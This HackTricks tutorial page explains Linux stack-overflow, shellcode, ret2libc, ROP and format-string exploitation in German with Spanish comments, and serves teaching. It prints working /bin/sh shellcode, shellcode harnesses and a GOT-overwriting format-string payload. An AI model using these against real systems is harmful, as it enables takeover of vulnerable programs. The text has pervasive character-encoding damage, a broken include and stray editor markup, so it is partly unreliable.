# Linux Exploiting (Grundlagen) (SPA)

## Linux Exploiting (Grundlagen) (SPA)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## **ASLR**

Address Space Layout Randomization

**Globale Deaktivierung der Zuf√§lligkeit (ASLR) (Root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Globale Reaktivierung der Zuf√§lligkeit: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Deaktivierung f√ºr eine Ausf√ºhrung** (kein Root erforderlich):\
setarch \`arch\` -R ./beispiel argumente\
setarch \`uname -m\` -R ./beispiel argumente

**Deaktivierung des Stack-Schutzes**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack beispiel.c -o beispiel

**Core-Datei**\
ulimit -c unlimited\
gdb /exec core\_datei\
/etc/security/limits.conf -> \* soft core unlimited

**Text**\
**Daten**\
**BSS**\
**Heap**

**Stack**

**BSS-Abschnitt**: Nicht initialisierte globale oder statische Variablen
```
static int i;
```
**DATENABSCHNITT**: Initialisierte globale oder statische Variablen

In diesem Abschnitt werden initialisierte globale oder statische Variablen behandelt.
```
int i = 5;
```
**Abschnitt TEXT**: Anweisungen des Codes (Opcodes)

**Abschnitt HEAP**: Dynamisch reservierte Puffer (malloc(), calloc(), realloc())

**Abschnitt STACK**: Der Stapel (√ºbergebene Argumente, Umgebungszeichenketten (env), lokale Variablen...)

## **1. STACK OVERFLOWS**

> Puffer√ºberlauf, Puffer√ºberschreitung, Stapel√ºberschreitung, Stapelzerst√∂rung

Segmentierungsfehler oder Segmentierungsverletzung: Wenn versucht wird, auf eine Speicheradresse zuzugreifen, die dem Prozess nicht zugewiesen wurde.

Um die Adresse einer Funktion in einem Programm zu erhalten, kann Folgendes verwendet werden:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Aufruf von sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Kernel-Unterbrechungen anzeigen: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax l√∂schen\
xor ebx, ebx ; ebx = 0, da kein Argument √ºbergeben wird\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Syscall ausf√ºhren

**nasm -f elf assembly.asm** ‚Äî> Gibt eine .o-Datei zur√ºck\
**ld assembly.o -o shellcodeout** ‚Äî> Erzeugt eine ausf√ºhrbare Datei aus dem Assemblercode und wir k√∂nnen die Opcodes mit **objdump** extrahieren\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Zeigt, dass es sich tats√§chlich um unseren Shellcode handelt und gibt die Opcodes aus

**√úberpr√ºfen, ob der Shellcode funktioniert**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Um sicherzustellen, dass die Systemaufrufe ordnungsgem√§√ü ausgef√ºhrt werden, sollte das vorherige Programm kompiliert werden und die Systemaufrufe sollten in **strace ./KOMPILIERTES\_PROGRAMM** angezeigt werden.

Beim Erstellen von Shellcodes kann ein Trick angewendet werden. Die erste Anweisung ist ein Sprung zu einem Aufruf. Der Aufruf ruft den Originalcode auf und legt auch den EIP im Stack ab. Nach der Aufrufanweisung haben wir den ben√∂tigten String eingef√ºgt, sodass wir mit diesem EIP auf den String verweisen und den Code weiter ausf√ºhren k√∂nnen.

BEISPIEL **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Verwendung des Stack (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

Die `FNSTENV`-Instruktion speichert den aktuellen Zustand des FPU-Registers in einem Speicherbereich. Dieser Befehl wird h√§ufig verwendet, um den FPU-Zustand zu speichern, bevor ein Exploit ausgef√ºhrt wird, um den urspr√ºnglichen Zustand wiederherzustellen und die Ausf√ºhrung des Programms fortzusetzen, ohne Verdacht zu erregen.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Es handelt sich um einen kleinen Code, der die Speicherseiten eines Prozesses nach der darin gespeicherten Shellcode durchsucht (er sucht nach einer Signatur im Shellcode). N√ºtzlich in F√§llen, in denen nur wenig Platz zum Injizieren von Code zur Verf√ºgung steht.

**Polymorphe Shellcodes**

Es handelt sich um verschl√ºsselte Shells, die einen kleinen Code enthalten, der sie entschl√ºsselt und zu ihm springt, unter Verwendung des Call-Pop-Tricks. Hier ist ein Beispiel f√ºr eine Caesar-Verschl√ºsselung:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Angriff auf den Frame Pointer (EBP)**

N√ºtzlich in einer Situation, in der wir den EBP, aber nicht den EIP, √§ndern k√∂nnen.

Es ist bekannt, dass beim Verlassen einer Funktion der folgende Assemblercode ausgef√ºhrt wird:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Auf diese Weise kann das EBP ge√§ndert werden, wenn eine Funktion (fvuln), die von einer anderen Funktion aufgerufen wurde, verlassen wird. Wenn die Funktion, die fvuln aufgerufen hat, beendet wird, kann ihr EIP ge√§ndert werden.

In fvuln kann ein falsches EBP eingef√ºhrt werden, das auf einen Speicherort zeigt, an dem sich die Adresse des Shellcodes + 4 befindet (4 muss f√ºr das Pop hinzugef√ºgt werden). Auf diese Weise wird beim Verlassen der Funktion der Wert von &(\&Shellcode)+4 in ESP eingef√ºgt, mit dem Pop wird 4 von ESP abgezogen und er zeigt auf die Adresse des Shellcodes, wenn das Ret ausgef√ºhrt wird.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + F√ºllung + &(\&Shellcode)+4

**Off-by-One Exploit**\
Es ist nur m√∂glich, das am wenigsten signifikante Byte des EBP zu √§ndern. Ein Angriff wie oben beschrieben kann durchgef√ºhrt werden, aber der Speicher, der die Adresse des Shellcodes enth√§lt, muss die ersten 3 Bytes mit dem EBP teilen.

## **4. Return-to-Libc-Methoden**

N√ºtzliche Methode, wenn der Stack nicht ausf√ºhrbar ist oder ein sehr kleiner Puffer zum √Ñndern vorhanden ist.

ASLR bewirkt, dass Funktionen bei jeder Ausf√ºhrung an unterschiedlichen Speicherpositionen geladen werden. Daher kann diese Methode in diesem Fall m√∂glicherweise nicht wirksam sein. F√ºr Remote-Server, da das Programm st√§ndig an derselben Adresse ausgef√ºhrt wird, kann es jedoch n√ºtzlich sein.

* **cdecl (C-Deklaration)** legt die Argumente auf den Stack und bereinigt den Stack nach Verlassen der Funktion
* **stdcall (Standardaufruf)** legt die Argumente auf den Stack und die aufrufende Funktion bereinigt den Stack
* **fastcall** legt die ersten beiden Argumente in Register und den Rest auf den Stack

Die Adresse der Systemanweisung in libc wird angegeben und der String "/bin/sh" wird als Argument √ºbergeben, normalerweise aus einer Umgebungsvariable. Dar√ºber hinaus wird die Adresse der Exit-Funktion verwendet, damit das Programm nach dem Verlassen der Shell ohne Probleme beendet wird (und Logs geschrieben werden).

**export SHELL=/bin/sh**

Um die ben√∂tigten Adressen zu finden, k√∂nnen Sie in **GDB** nachschauen:\
**p system**\
**p exit**\
**rabin2 -i ausf√ºhrbar** ‚Äî> Gibt die Adresse aller Funktionen an, die das Programm beim Laden verwendet\
(In einem Start oder einem Breakpoint): **x/500s $esp** ‚Äî> Hier suchen wir nach dem String /bin/sh

Sobald wir diese Adressen haben, sieht der **Exploit** wie folgt aus:

"A" \* EBP-Abstand + 4 (EBP: k√∂nnen 4 "A"s sein, aber es ist besser, wenn es das echte EBP ist, um Segmentierungsfehler zu vermeiden) + Adresse von **system** (√ºberschreibt EIP) + Adresse von **exit** (beim Verlassen von system("/bin/sh") wird diese Funktion aufgerufen, da die ersten 4 Bytes des Stacks als die n√§chste auszuf√ºhrende EIP-Adresse behandelt werden) + Adresse von "**/bin/sh**" (wird als Parameter an system √ºbergeben)

Auf diese Weise wird der EIP mit der Adresse von system √ºberschrieben, die den String "/bin/sh" als Parameter erh√§lt, und beim Verlassen wird die Funktion exit() ausgef√ºhrt.

Es kann vorkommen, dass ein Byte einer Adresse einer Funktion null oder Leerzeichen (\x20) ist. In diesem Fall k√∂nnen die vorherigen Adressen disassembliert werden, da wahrscheinlich mehrere NOPs vorhanden sind, die es uns erm√∂glichen, anstelle der Funktion direkt einen von ihnen aufzurufen (z. B. mit > x/8i system-4).

Diese Methode funktioniert, weil beim Aufruf einer Funktion wie system mit dem Opcode **ret** anstelle von **call** die Funktion davon ausgeht, dass die ersten 4 Bytes die **EIP**-Adresse sind, zu der zur√ºckgekehrt werden soll.

Eine interessante Technik bei dieser Methode besteht darin, **strncpy()** aufzurufen, um eine Nutzlast vom Stack zum Heap zu verschieben, und dann **gets()** zu verwenden, um diese Nutzlast auszuf√ºhren.

Eine weitere interessante Technik ist die Verwendung von **mprotect()**, mit der die gew√ºnschten Berechtigungen f√ºr jeden Teil des Speichers festgelegt werden k√∂nnen. Es funktioniert oder funktionierte in BDS, MacOS und OpenBSD, aber nicht in Linux (es wird verhindert, dass Schreib- und Ausf√ºhrungsberechtigungen gleichzeitig vergeben werden k√∂nnen). Mit diesem Angriff k√∂nnte der Stack wieder als ausf√ºhrbar konfiguriert werden.

**Verkettung von Funktionen**

Basierend auf der vorherigen Technik besteht dieser Exploit darin:\
F√ºllung + \&Funktion1 + \&pop;ret; + \&arg\_fun1 + \&Funktion2 + \&pop;ret; + \&arg\_fun2 + ...

Auf diese Weise k√∂nnen Funktionen verkettet werden, die aufgerufen werden sollen. Wenn Funktionen mit mehreren Argumenten verwendet werden sollen, k√∂nnen die erforderlichen Argumente (z. B. 4) platziert und die 4 Argumente eingegeben werden, und es kann nach einer Adresse mit Opcodes wie pop, pop, pop, pop, ret gesucht werden ‚Äî> **objdump -d ausf√ºhrbar**

**Verkettung durch F√§lschen von Frames (Verkettung von EBPs)**

Hierbei wird die M√∂glichkeit genutzt, das EBP zu manipulieren, um die Ausf√ºhrung mehrerer Funktionen √ºber das EBP und "leave;ret" zu verkettet.

F√úLLUNG

* Wir setzen ein falsches EBP, das aufzeigt: 2. falsches EBP + die auszuf√ºhrende Funktion: (\&system() + \&leave;ret + &"/bin/sh")
* Im EIP setzen wir die Adresse einer Funktion &(leave;ret)

Wir starten den Shellcode mit der Adresse des n√§chsten Teils des Shellcodes, z. B.: 2. falsches EBP + \&system() + &(leave;ret;) + &"/bin/sh"

Das 2. EBP w√§re: 3. falsches EBP + \&system() + &(leave;ret;) + &"/bin/ls"

Dieser Shellcode kann beliebig oft in den zug√§nglichen Speicherbereichen wiederholt werden, sodass ein Shellcode entsteht, der leicht in kleine Speicherst√ºcke aufgeteilt werden kann.

(Die Ausf√ºhrung von Funktionen wird durch die vorherigen Schwachstellen von EBP und ret2lib verkettet)

## **5. Erg√§nzende Methoden**

**Ret2Ret**

N√ºtzlich, wenn eine Adresse des Stacks nicht in den EIP eingef√ºgt werden kann (es wird √ºberpr√ºft, ob der EIP nicht 0xbf enth√§lt) oder wenn der Speicherort des Shellcodes nicht berechnet werden kann. Die anf√§llige Funktion akzeptiert jedoch einen Parameter (der Shellcode wird hier platziert).

Auf diese Weise wird durch √Ñndern des EIP in eine Adresse eines **ret** die n√§chste Adresse geladen (die die Adresse des ersten Arguments der Funktion ist). Mit anderen Worten, der Shellcode wird geladen.

Der Exploit sieht wie folgt aus: SHELLCODE + F√ºllung (bis EIP) + **\&ret** (die n√§chsten Bytes des Stacks zeigen auf den Anfang des Shellcodes, da die Adresse des √ºbergebenen Parameters in den Stack eingegeben wird)

Es scheint, dass Funktionen wie **strncpy**, sobald sie abgeschlossen sind, die Adresse, an der der Shellcode gespeichert war, aus dem Stack entfernen und diese Technik daher unm√∂glich machen. Mit anderen Worten, die Adresse, die der Funktion als Argument √ºbergeben wird (die den Shellcode speichert), wird durch ein 0x00 ge√§ndert, sodass beim Aufruf des zweiten **ret** ein 0x00 gefunden wird und das Programm abst√ºrzt.
```
**Ret2PopRet**
```
Wenn wir keine Kontrolle √ºber das erste Argument haben, aber √ºber das zweite oder dritte, k√∂nnen wir EIP mit einer Adresse zu pop-ret oder pop-pop-ret √ºberschreiben, je nachdem, welche wir ben√∂tigen.

**Murat-Technik**

In Linux werden alle Programme ab 0xbfffffff gemappt.

Indem wir uns ansehen, wie der Stack eines neuen Prozesses in Linux aufgebaut wird, k√∂nnen wir einen Exploit entwickeln, bei dem das Programm in einer Umgebung gestartet wird, die nur eine Variable, die Shellcode, enth√§lt. Die Adresse daf√ºr kann wie folgt berechnet werden: addr = 0xbfffffff - 4 - strlen(VOLLST√ÑNDIGER_PROGRAMMNAME) - strlen(shellcode)

Auf diese Weise erhalten wir einfach die Adresse, an der sich die Umgebungsvariable mit dem Shellcode befindet.

Dies ist m√∂glich, da die Funktion execle eine Umgebung erstellt, die nur die gew√ºnschten Umgebungsvariablen enth√§lt.

**Jump to ESP: Windows-Stil**

Da ESP immer auf den Anfang des Stacks zeigt, besteht diese Technik darin, EIP durch die Adresse eines **jmp esp** oder **call esp** Befehls zu ersetzen. Dadurch wird der Shellcode nach der √úberschreibung von EIP gespeichert, da ESP nach dem Ausf√ºhren von **ret** auf die n√§chste Adresse zeigt, genau dort, wo der Shellcode gespeichert wurde.

Wenn ASLR in Windows oder Linux nicht aktiviert ist, k√∂nnen **jmp esp** oder **call esp** aus einem gemeinsam genutzten Objekt aufgerufen werden. Wenn ASLR aktiviert ist, kann es im verwundbaren Programm selbst gesucht werden.

Dar√ºber hinaus erm√∂glicht die Tatsache, dass der Shellcode nach der Korruption von EIP platziert wird, anstatt in der Mitte des Stacks, dass die push- oder pop-Anweisungen, die w√§hrend der Funktion ausgef√ºhrt werden, den Shellcode nicht ber√ºhren (was passieren k√∂nnte, wenn er in der Mitte des Stacks der Funktion platziert w√ºrde).

√Ñhnlich dazu kann, wenn wir wissen, dass eine Funktion die Adresse speichert, an der der Shellcode gespeichert ist, **call eax** oder **jmp eax (ret2eax)** aufgerufen werden.

**ROP (Return Oriented Programming) oder borrowed code chunks**

Die aufgerufenen Codefragmente werden als Gadgets bezeichnet.

Diese Technik besteht darin, verschiedene Funktionsaufrufe mit der Technik **ret2libc** und der Verwendung von **pop,ret** zu verketten.

In einigen Prozessorarchitekturen besteht jede Anweisung aus 32 Bits (z. B. MIPS). Bei Intel hingegen haben die Anweisungen eine variable Gr√∂√üe und mehrere Anweisungen k√∂nnen einen Satz von Bits teilen, zum Beispiel:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Enth√§lt die Bytes 0xffe4, die auch als **jmp \*%esp** √ºbersetzt werden k√∂nnen.

Auf diese Weise k√∂nnen einige Anweisungen ausgef√ºhrt werden, die im urspr√ºnglichen Programm nicht einmal vorhanden sind.

**ROPgadget.py** hilft uns dabei, Werte in Bin√§rdateien zu finden.

Dieses Programm dient auch zum Erstellen von **Payloads**. Sie k√∂nnen ihm die Bibliothek geben, aus der Sie die ROPs extrahieren m√∂chten, und es generiert ein Python-Payload, dem Sie die Adresse der Bibliothek geben, und der Payload ist bereit, als Shellcode verwendet zu werden. Da es Systemaufrufe verwendet, f√ºhrt es nichts wirklich im Stack aus, sondern speichert nur Adressen von ROPs, die durch **ret** ausgef√ºhrt werden. Um diesen Payload zu verwenden, muss der Payload mit einer **ret**-Anweisung aufgerufen werden.

**Integer-√úberl√§ufe**

Diese Art von √úberl√§ufen tritt auf, wenn eine Variable nicht darauf vorbereitet ist, eine so gro√üe Zahl wie die √ºbergebene zu verarbeiten, m√∂glicherweise aufgrund einer Verwechslung zwischen vorzeichenbehafteten und vorzeichenlosen Variablen, zum Beispiel:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Im obigen Beispiel sehen wir, dass das Programm 2 Parameter erwartet. Der erste ist die L√§nge des folgenden Strings und der zweite ist der String selbst.

Wenn wir als ersten Parameter eine negative Zahl √ºbergeben, wird festgestellt, dass len < 256 und dieser Filter umgangen wird. Au√üerdem wird strlen(buffer) kleiner als l sein, da l ein unsigned int ist und sehr gro√ü sein wird.

Diese Art von √úberl√§ufen zielt nicht darauf ab, etwas im Prozess des Programms zu schreiben, sondern darauf, schlecht konzipierte Filter zu umgehen, um andere Schwachstellen auszunutzen.

**Nicht initialisierte Variablen**

Es ist nicht bekannt, welchen Wert eine nicht initialisierte Variable annehmen kann, und es k√∂nnte interessant sein, dies zu beobachten. Es kann sein, dass sie den Wert annimmt, den eine Variable aus der vorherigen Funktion hatte und die vom Angreifer kontrolliert wird.

## **Format Strings**

In C ist **`printf`** eine Funktion, die verwendet werden kann, um einen String auszugeben. Der **erste Parameter**, den diese Funktion erwartet, ist der **rohe Text mit den Formatierern**. Die **folgenden Parameter** sind die **Werte**, die die **Formatierer** im rohen Text ersetzen sollen.

Die Schwachstelle tritt auf, wenn ein **Angreifertext als erster Argument** an diese Funktion √ºbergeben wird. Der Angreifer kann eine **spezielle Eingabe erstellen**, indem er die **F√§higkeiten der printf-Formatzeichenfolge** missbraucht, um beliebige Daten an beliebige Adressen zu schreiben. Dadurch ist es m√∂glich, **beliebigen Code auszuf√ºhren**.

Formatierer:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **schreibt** die **Anzahl der geschriebenen Bytes** in die **angegebene Adresse. Indem** wir so viele **Bytes** schreiben, wie die hexadezimale Zahl, die wir **schreiben m√ºssen**, k√∂nnen wir **beliebige Daten schreiben**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Dies ist die Tabelle, die die **Adresse** der **externen Funktionen** enth√§lt, die vom Programm verwendet werden.

Erhalten Sie die Adresse dieser Tabelle mit: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Beachten Sie, wie Sie nach dem **Laden** der **ausf√ºhrbaren Datei** in GEF die **Funktionen** sehen k√∂nnen, die sich in der **GOT** befinden: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Mit GEF k√∂nnen Sie eine **Debugging-Sitzung** starten und **`got`** ausf√ºhren, um die GOT-Tabelle anzuzeigen:

![](<../../.gitbook/assets/image (621).png>)

In einer Bin√§rdatei enth√§lt die GOT die **Adressen der Funktionen oder** des **PLT**-Abschnitts, der die Funktionsadresse l√§dt. Das Ziel dieses Exploits ist es, den **GOT-Eintrag** einer Funktion zu **√ºberschreiben**, die sp√§ter **mit** der **Adresse** des PLT der **`system`**-**Funktion** ausgef√ºhrt wird. Idealerweise √ºberschreiben Sie die GOT einer Funktion, die mit von Ihnen kontrollierten Parametern aufgerufen wird (damit Sie die an die Systemfunktion gesendeten Parameter kontrollieren k√∂nnen).

Wenn das Skript **`system`** **nicht verwendet**, hat die Systemfunktion **keinen Eintrag** in der GOT. In diesem Szenario m√ºssen Sie zuerst die Adresse der `system`-Funktion **leaken**.

Die **Procedure Linkage Table** ist eine **schreibgesch√ºtzte** Tabelle in der ELF-Datei, die alle erforderlichen **Symbole speichert, die aufgel√∂st werden m√ºssen**. Wenn eine dieser Funktionen aufgerufen wird, leitet die GOT den Fluss zum PLT weiter, damit es die Adresse der Funktion aufl√∂sen und in die GOT schreiben kann.\
Dann wird beim n√§chsten Aufruf an diese Adresse die Funktion direkt aufgerufen, ohne sie aufl√∂sen zu m√ºssen.

Sie k√∂nnen die PLT-Adressen mit **`objdump -j .plt -d ./vuln_binary`** sehen.

### **Exploit-Ablauf**

Wie bereits erkl√§rt, besteht das Ziel darin, die **Adresse einer Funktion** in der **GOT-Tabelle** zu **√ºberschreiben**, die sp√§ter aufgerufen wird. Idealerweise k√∂nnten wir die **Adresse auf einen Shellcode** in einem ausf√ºhrbaren Abschnitt setzen, aber h√∂chstwahrscheinlich k√∂nnen Sie keinen Shellcode in einem ausf√ºhrbaren Abschnitt schreiben.\
Eine andere Option besteht darin, eine Funktion zu **√ºberschreiben**, die ihre **Argumente** vom **Benutzer** erh√§lt, und sie auf die **`system`**-**Funktion** zu zeigen.

Um die Adresse zu schreiben, werden normalerweise 2 Schritte durchgef√ºhrt: Sie schreiben zuerst **2 Bytes** der Adresse und dann die anderen 2. Dazu wird **`$hn`** verwendet.

**HOB** bezieht sich auf die 2 h√∂heren Bytes der Adresse\
**LOB** bezieht sich auf die 2 niedrigeren Bytes der Adresse

Aufgrund der Funktionsweise von Format-Strings m√ºssen Sie zuerst das kleinere der beiden \[HOB, LOB] schreiben und dann das andere.

Wenn HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Wenn HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format String Exploit Template**

Sie finden hier eine **Vorlage**, um die GOT mit Format-Strings auszunutzen:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Dies ist im Wesentlichen eine Struktur mit **Funktionen, die vor dem Beenden des Programms aufgerufen werden**. Dies ist interessant, wenn Sie Ihren **Shellcode einfach durch Springen zu einer Adresse aufrufen** k√∂nnen oder in F√§llen, in denen Sie erneut zu main zur√ºckkehren m√ºssen, um den Format-String ein zweites Mal auszunutzen.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Beachten Sie, dass dies keine endlose Schleife erzeugt, da der Canary bemerken wird, dass das Ende des Stacks m√∂glicherweise besch√§digt ist und die Funktion nicht erneut aufgerufen wird. Mit diesem Trick k√∂nnen Sie also eine weitere Ausf√ºhrung der Schwachstelle haben.

### Format Strings zum Auslesen von Inhalten

Eine Format-String-Schwachstelle kann auch dazu missbraucht werden, Inhalte aus dem Speicher des Programms auszulesen.\
In der folgenden Situation gibt es zum Beispiel eine lokale Variable im Stack, die auf eine Flagge zeigt. Wenn Sie herausfinden, an welcher Stelle im Speicher der Zeiger auf die Flagge steht, k√∂nnen Sie `printf` dazu bringen, auf diese Adresse zuzugreifen und die Flagge auszugeben:

Die Flagge befindet sich also an der Adresse **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Und aus dem Leak k√∂nnen Sie sehen, dass der Zeiger auf die Flagge im 8. Parameter steht:

![](<../../.gitbook/assets/image (623).png>)

Daher k√∂nnen Sie durch den Zugriff auf den 8. Parameter die Flagge erhalten:

![](<../../.gitbook/assets/image (624).png>)

Beachten Sie, dass Sie nach dem vorherigen Angriff und der Erkenntnis, dass Sie Inhalte auslesen k√∂nnen, Zeiger auf `printf` auf den Abschnitt setzen k√∂nnen, in dem das ausf√ºhrbare Programm geladen ist, und diesen vollst√§ndig auslesen!

### DTOR

{% hint style="danger" %}
Heutzutage ist es sehr ungew√∂hnlich, eine Bin√§rdatei mit einem DTOR-Abschnitt zu finden.
{% endhint %}

Die Destruktoren sind Funktionen, die vor dem Beenden des Programms ausgef√ºhrt werden.\
Wenn es Ihnen gelingt, eine Adresse zu einem Shellcode in `__DTOR_END__` zu schreiben, wird dieser vor dem Beenden des Programms ausgef√ºhrt.\
Erhalten Sie die Adresse dieses Abschnitts mit:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Normalerweise finden Sie den **DTOR**-Abschnitt **zwischen** den Werten `ffffffff` und `00000000`. Wenn Sie also nur diese Werte sehen, bedeutet dies, dass keine Funktion registriert ist. √úberschreiben Sie also die `00000000` mit der Adresse des Shellcodes, um ihn auszuf√ºhren.

### **Format Strings f√ºr Puffer√ºberl√§ufe**

Die Funktion **sprintf** kopiert einen formatierten String in eine Variable. Daher k√∂nnen Sie das Format eines Strings missbrauchen, um einen Puffer√ºberlauf in der Variable zu verursachen, in die der Inhalt kopiert wird. 
Beispielsweise schreibt das Payload `%.44xAAAA` 44B+"AAAA" in die Variable, was einen Puffer√ºberlauf verursachen kann.

### **\_\_atexit-Strukturen**

{% hint style="danger" %}
Heutzutage ist es sehr ungew√∂hnlich, dies auszunutzen.
{% endhint %}

**`atexit()`** ist eine Funktion, der andere Funktionen als Parameter √ºbergeben werden. Diese Funktionen werden ausgef√ºhrt, wenn ein `exit()` oder die R√ºckkehr von `main` ausgef√ºhrt wird. 
Wenn Sie die Adresse einer dieser Funktionen so √§ndern k√∂nnen, dass sie auf einen Shellcode zeigt, k√∂nnen Sie die Kontrolle √ºber den Prozess √ºbernehmen, aber dies ist derzeit komplizierter. 
